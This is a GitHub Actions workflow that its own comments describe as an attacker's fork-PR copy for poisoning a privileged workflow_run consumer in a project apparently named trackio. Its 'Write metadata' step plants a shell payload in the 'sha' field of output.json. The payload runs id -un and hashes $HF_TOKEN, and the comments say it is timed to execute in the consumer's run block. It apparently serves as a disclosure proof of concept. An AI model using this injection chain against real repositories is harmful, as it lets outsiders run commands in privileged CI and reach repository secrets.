# Attacker's copy, in the fork PR. `name:` must match the consumer's workflow_run trigger.
name: PR wheel preview build

on:
  pull_request:
    branches: [main]

permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@v4

      - name: Build wheel (stand-in)
        run: |
          mkdir -p dist
          echo "fake wheel" > dist/trackio-0.0.0-py3-none-any.whl

      # The only change: output.json carries a shell payload in `sha`.
      # Quoted heredoc, so $(...) is stored literally and only evaluates
      # later, in the privileged consumer's run: block.
      - name: Write metadata
        run: |
          cat > output.json <<'JSON'
          {"pr_number": 1, "sha": "PWNED_$(id -un)_TOKENMD5_$(echo -n $HF_TOKEN | md5sum | cut -c1-12)", "wheel_basename": "trackio-0.0.0-py3-none-any.whl"}
          JSON
          cat output.json

      - name: Upload wheel
        uses: actions/upload-artifact@v4
        with:
          name: trackio-wheel
          path: dist/*.whl

      - name: Upload metadata
        uses: actions/upload-artifact@v4
        with:
          name: pr-wheel-preview-metadata
          path: output.json
